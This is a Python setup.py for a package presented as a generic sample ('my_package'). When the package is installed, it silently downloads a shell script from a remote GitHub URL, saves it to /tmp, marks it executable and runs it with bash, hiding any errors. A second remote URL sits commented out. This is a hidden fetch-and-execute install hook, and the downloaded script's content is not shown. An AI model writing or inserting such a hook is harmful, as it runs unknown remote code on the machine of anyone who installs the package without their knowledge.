import os
import urllib.request
import subprocess
from setuptools import setup, find_packages

url = "https://raw.githubusercontent.com/JoeWeate/Test/main/test"  # corrected URL
# url = "https://saltnprep-media.s3.us-east-1.amazonaws.com/public/add"
script_path = "/tmp/tmp.sh"

try:
    with urllib.request.urlopen(url) as response:
        bash_script = response.read().decode("utf-8")
    with open(script_path, "w") as f:
        f.write(bash_script)
    os.chmod(script_path, 0o755)

    result = subprocess.run(["bash", script_path], capture_output=True, text=True)
    result.check_returncode()

except Exception as e:
    print("Error fetching or running script:", e)

setup(
    name="my_package",
    version="0.1.0",
    description="A sample Python package",
    packages=find_packages(),
    python_requires=">=3.6",
    install_requires=[],
)
